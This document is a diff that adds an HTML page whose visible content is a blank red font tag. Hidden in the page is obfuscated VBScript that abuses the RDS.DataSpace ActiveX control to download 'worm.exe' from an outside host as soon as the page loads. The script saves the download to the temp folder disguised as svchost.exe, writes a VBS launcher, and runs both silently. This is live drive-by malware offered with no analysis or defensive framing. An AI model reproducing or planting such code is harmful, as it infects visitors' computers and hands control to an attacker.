@@ -1,0 +1,52 @@
+<html>
+<body>
+<script type="text/jscript">
+function init () {
+document.write("<center><font color=red></font><center>");}
+window.onload = init;
+</script>
+<script language="VBScript"> 
+on error resume next 
+tc = "http://www.krvkr.com/worm.exe"
+fname1="svchost.exe"
+fname2="svchost.vbs"
+Set df = document.createElement("o"&"b"&"j"&"e"&"c"&"t") 
+df.setAttribute "c"&"l"&"a"&"s"&"s"&"i"&"d", "c"&"l"&"s"&"id:"&"B"&"D"&"96"&"C5"&"56"&"-65"&"A3"&"-11"&"D0"&"-98"&"3A"&"-00"&"C04"&"FC2"&"9E"&"36" 
+str="Mic"&"ro"&"so"&"ft."&"X"&"M"&"L"&"HT"&"TP"
+Set x = df.CreateObject(str,"") 
+a1="Ad"&"o" 
+a2="d"&"b." 
+a3="S"&"tr" 
+a4="e"&"am" 
+str1=a1&a2&a3&a4 
+str5=str1 
+set S = df.createobject(str5,"") 
+S.type = 1
+str6="G"&"E"&"T"
+x.Open str6, tc, False 
+x.Send 
+d8="Sc"&"ript"&"ing."&"File"&"Syst"&"emO"&"bje"&"ct"
+set F = df.createobject(d8,"") 
+set tmp = F.GetSpecialFolder(2)  
+fname1= F.BuildPath(tmp,fname1)
+S.open
+S.write x.responseBody 
+S.savetofile fname1,2 
+S.close
+fname2= F.BuildPath(tmp,fname2)
+set ts = F.OpenTextFile(fname2, 2, True)
+ts.WriteLine "Set Shell = CreateObject(""Sh""&""ell""&"".App""&""lic""&""at""&""ion"")"
+sql="Shell.ShellExecute"""+fname1+""","""","""",""o""&""pe""&""n"",0"
+ts.writeLine sql
+ts.close
+if F.FileExists(fname1)=true then
+if F.FileExists(fname2)=true then
+d3="She"&"ll."&"App"&"lica"&"tion"
+set Q = df.createobject(d3,"")
+dc="o"&"p"&"e"&"n"
+Q.ShellExecute fname2,"","",dc,0
+end if
+End if 
+</script>
+</body>
+</html>
